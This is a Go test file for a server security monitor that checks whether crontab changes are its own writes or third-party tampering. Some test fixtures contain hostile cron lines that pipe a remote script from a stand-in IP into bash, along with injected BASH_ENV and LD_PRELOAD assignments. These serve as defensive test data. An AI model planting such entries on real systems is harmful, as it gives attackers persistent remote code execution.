package checks

import (
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/pidginhost/csm/internal/state"
)

// CSM's own writes must never be the thing that raises a finding. The in-memory
// ledger expires after 15 minutes and is lost on restart, and a cPanel crontab
// wrapper rewrites the spool file (adding SHELL=, dropping comments) after CSM
// hands it over, so the structural recognizer cannot always vouch for the
// result either. The durable record binds the exact bytes to the file CSM
// changed, so a later replacement does not inherit suppression.

func newSelfWriteTestStore(t *testing.T) (*state.Store, string) {
	t.Helper()
	stateDir := t.TempDir()
	st, err := state.Open(stateDir)
	if err != nil {
		t.Fatalf("state.Open: %v", err)
	}
	t.Cleanup(func() { _ = st.Close() })
	return st, stateDir
}

func newSelfWriteTestFile(t *testing.T, content []byte) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "crontab")
	if err := os.WriteFile(path, content, 0o600); err != nil {
		t.Fatalf("write self-write test file: %v", err)
	}
	return path
}

// withExpiredMemoryLedger runs fn with the in-memory ledger aged past its TTL,
// which is what a daemon restart leaves behind.
func withExpiredMemoryLedger(t *testing.T, fn func()) {
	t.Helper()
	orig := selfWriteNow
	selfWriteNow = func() time.Time { return orig().Add(2 * selfWriteTTL) }
	defer func() { selfWriteNow = orig }()
	fn()
}

func TestSelfWriteSurvivesLedgerExpiry(t *testing.T) {
	resetSelfWrites(t)
	st, _ := newSelfWriteTestStore(t)
	SetSelfWriteStore(st)
	defer SetSelfWriteStore(nil)

	content := []byte("SHELL=\"/usr/local/cpanel/bin/jailshell\"\n* * * * * true\n")
	path := newSelfWriteTestFile(t, content)
	RecordSelfWrite(path, content)

	withExpiredMemoryLedger(t, func() {
		if !isExpectedSelfWrite(path, content) {
			t.Error("CSM's own write should stay suppressed after the in-memory ledger expires")
		}
	})
}

func TestSelfWriteIsPersistedBeforeLaterStateSave(t *testing.T) {
	resetSelfWrites(t)
	st, stateDir := newSelfWriteTestStore(t)
	SetSelfWriteStore(st)
	defer SetSelfWriteStore(nil)

	content := []byte("* * * * * true\n")
	path := newSelfWriteTestFile(t, content)
	RecordSelfWrite(path, content)

	// Simulate an abrupt restart: do not close the first Store before opening
	// the state file again.
	SetSelfWriteStore(nil)
	resetSelfWrites(t)
	reopened, err := state.Open(stateDir)
	if err != nil {
		t.Fatalf("reopen state: %v", err)
	}
	defer func() { _ = reopened.Close() }()
	SetSelfWriteStore(reopened)

	if !isExpectedSelfWrite(path, content) {
		t.Error("durable self-write must survive before another scan saves state")
	}
}

func TestSelfWriteDurableRecordStillRejectsTamper(t *testing.T) {
	resetSelfWrites(t)
	st, _ := newSelfWriteTestStore(t)
	SetSelfWriteStore(st)
	defer SetSelfWriteStore(nil)

	content := []byte("* * * * * true\n")
	path := newSelfWriteTestFile(t, content)
	RecordSelfWrite(path, content)

	withExpiredMemoryLedger(t, func() {
		tampered := []byte("* * * * * true\n* * * * * curl http://198.51.100.9/x | bash\n")
		if isExpectedSelfWrite(path, tampered) {
			t.Error("content layered on top of CSM's write must still be reported")
		}
	})
}

func TestSelfWriteDurableRecordRejectsRecreatedFile(t *testing.T) {
	for _, tc := range []struct {
		name    string
		content []byte
	}{
		{name: "non-empty", content: []byte("* * * * * true\n")},
		{name: "empty", content: []byte{}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			resetSelfWrites(t)
			st, _ := newSelfWriteTestStore(t)
			SetSelfWriteStore(st)
			defer SetSelfWriteStore(nil)

			path := newSelfWriteTestFile(t, tc.content)
			RecordSelfWrite(path, tc.content)

			replacement := filepath.Join(filepath.Dir(path), "replacement")
			if err := os.WriteFile(replacement, tc.content, 0o600); err != nil {
				t.Fatalf("write replacement: %v", err)
			}
			if err := os.Rename(replacement, path); err != nil {
				t.Fatalf("replace recorded file: %v", err)
			}

			withExpiredMemoryLedger(t, func() {
				if isExpectedSelfWrite(path, tc.content) {
					t.Error("byte-identical third-party replacement must not inherit self-write suppression")
				}
			})
		})
	}
}

func TestForgetSelfWritesClearsDurableRecord(t *testing.T) {
	resetSelfWrites(t)
	st, stateDir := newSelfWriteTestStore(t)
	SetSelfWriteStore(st)
	defer SetSelfWriteStore(nil)

	content := []byte("* * * * * true\n")
	path := newSelfWriteTestFile(t, content)
	RecordSelfWrite(path, content)
	if err := st.Close(); err != nil {
		t.Fatalf("persist recorded self-write: %v", err)
	}
	forgetSelfWrites(path)

	SetSelfWriteStore(nil)
	resetSelfWrites(t)
	reopened, err := state.Open(stateDir)
	if err != nil {
		t.Fatalf("reopen state: %v", err)
	}
	defer func() { _ = reopened.Close() }()
	SetSelfWriteStore(reopened)

	if isExpectedSelfWrite(path, content) {
		t.Error("a forgotten self-write must not stay suppressed after restart")
	}
}

// Without a store configured the ledger must still work in memory and must not
// panic, so unit tests and one-shot CLI runs behave as before.
func TestSelfWriteWithoutStoreStaysInMemory(t *testing.T) {
	resetSelfWrites(t)
	SetSelfWriteStore(nil)
	path := "/var/spool/cron/nostore"
	content := []byte("* * * * * true\n")
	RecordSelfWrite(path, content)
	if !isExpectedSelfWrite(path, content) {
		t.Error("in-memory suppression must work without a durable store")
	}
	withExpiredMemoryLedger(t, func() {
		if isExpectedSelfWrite(path, content) {
			t.Error("without a store the record must still expire with the TTL")
		}
	})
}

// The cPanel crontab wrapper rewrites the spool file after `crontab -u` -- it
// prepends SHELL= and drops comments -- so a byte comparison against the staged
// buffer fails and CSM used to discard its own self-write record entirely. The
// result is on-disk content CSM caused, so it must still be recorded, while a
// job line that appeared from nowhere must not be vouched for.
func TestCrontabExplainedByAcceptsWrapperRewrite(t *testing.T) {
	expected := []byte("# CSM WP-Cron /home/u/public_html\n" +
		"7-59/15 * * * * cd '/home/u/public_html' && flock -n \"$HOME/.csm-wpcron-0dc0353a.lock\" '/usr/local/bin/php' -d max_execution_time=300 wp-cron.php >/dev/null 2>&1\n" +
		"0 */4 * * * /usr/local/bin/php /home/u/site/cron/import-feeds.php\n")
	onDisk := []byte("SHELL=\"/usr/local/cpanel/bin/jailshell\"\n" +
		"7-59/15 * * * * cd '/home/u/public_html' && flock -n \"$HOME/.csm-wpcron-0dc0353a.lock\" '/usr/local/bin/php' -d max_execution_time=300 wp-cron.php >/dev/null 2>&1\n" +
		"0 */4 * * * /usr/local/bin/php /home/u/site/cron/import-feeds.php\n")
	if !crontabExplainedBy(onDisk, expected) {
		t.Error("wrapper-rewritten crontab should still be recognized as CSM's own write")
	}
}

func TestCrontabExplainedByRejectsInjectedJob(t *testing.T) {
	expected := []byte("7-59/15 * * * * cd '/home/u/public_html' && flock -n \"$HOME/.csm-wpcron-0dc0353a.lock\" '/usr/local/bin/php' -d max_execution_time=300 wp-cron.php >/dev/null 2>&1\n")
	onDisk := append(append([]byte{}, expected...),
		[]byte("* * * * * curl -s http://198.51.100.9/x.sh | bash\n")...)
	if crontabExplainedBy(onDisk, expected) {
		t.Error("a job line CSM never wrote must not be vouched for as a self-write")
	}
}

func TestCrontabExplainedByRejectsUnsafeEnvAssignment(t *testing.T) {
	expected := []byte("7-59/15 * * * * cd '/home/u/public_html' && flock -n \"$HOME/.csm-wpcron-0dc0353a.lock\" '/usr/local/bin/php' -d max_execution_time=300 wp-cron.php >/dev/null 2>&1\n")
	onDisk := append([]byte("BASH_ENV=/tmp/.evil\n"), expected...)
	if crontabExplainedBy(onDisk, expected) {
		t.Error("an injected environment assignment must not be treated as a wrapper rewrite")
	}
}

func TestCrontabExplainedByRequiresEveryStagedActiveLine(t *testing.T) {
	expected := []byte("0 */4 * * * /usr/local/bin/php /home/u/import.php\n" +
		"7-59/15 * * * * cd '/home/u/public_html' && flock -n \"$HOME/.csm-wpcron-0dc0353a.lock\" '/usr/local/bin/php' -d max_execution_time=300 wp-cron.php >/dev/null 2>&1\n")
	onDisk := []byte("SHELL=\"/usr/local/cpanel/bin/jailshell\"\n" +
		"7-59/15 * * * * cd '/home/u/public_html' && flock -n \"$HOME/.csm-wpcron-0dc0353a.lock\" '/usr/local/bin/php' -d max_execution_time=300 wp-cron.php >/dev/null 2>&1\n")
	if crontabExplainedBy(onDisk, expected) {
		t.Error("a wrapper result missing a staged job must not be vouched for")
	}
}

func TestCrontabExplainedByRejectsDuplicatedStagedLine(t *testing.T) {
	expected := []byte("7-59/15 * * * * cd '/home/u/public_html' && flock -n \"$HOME/.csm-wpcron-0dc0353a.lock\" '/usr/local/bin/php' -d max_execution_time=300 wp-cron.php >/dev/null 2>&1\n")
	onDisk := append(append([]byte{}, expected...), expected...)
	if crontabExplainedBy(onDisk, expected) {
		t.Error("a duplicated job must not be vouched for by one staged occurrence")
	}
}

func TestCrontabExplainedByParsesEnvironmentQuotesStrictly(t *testing.T) {
	expected := []byte("7-59/15 * * * * cd '/home/u/public_html' && flock -n \"$HOME/.csm-wpcron-0dc0353a.lock\" '/usr/local/bin/php' -d max_execution_time=300 wp-cron.php >/dev/null 2>&1\n")
	tests := []struct {
		name string
		env  string
		want bool
	}{
		{name: "safe whitespace", env: `SHELL = "/usr/local/cpanel/bin/jailshell"`, want: true},
		{name: "nested quotes", env: `SHELL='"/bin/bash"'`, want: false},
		{name: "mismatched quotes", env: `SHELL="/bin/bash'`, want: false},
		{name: "spaced BASH_ENV", env: `BASH_ENV = "/tmp/.evil"`, want: false},
		{name: "quoted LD_PRELOAD", env: `LD_PRELOAD="/tmp/.evil.so"`, want: false},
		{name: "injected HOME", env: `HOME="/home/u"`, want: false},
		{name: "injected MAILTO", env: `MAILTO="attacker@example.com"`, want: false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			onDisk := append([]byte(tc.env+"\n"), expected...)
			if got := crontabExplainedBy(onDisk, expected); got != tc.want {
				t.Errorf("crontabExplainedBy with %q = %v, want %v", tc.env, got, tc.want)
			}
		})
	}
}
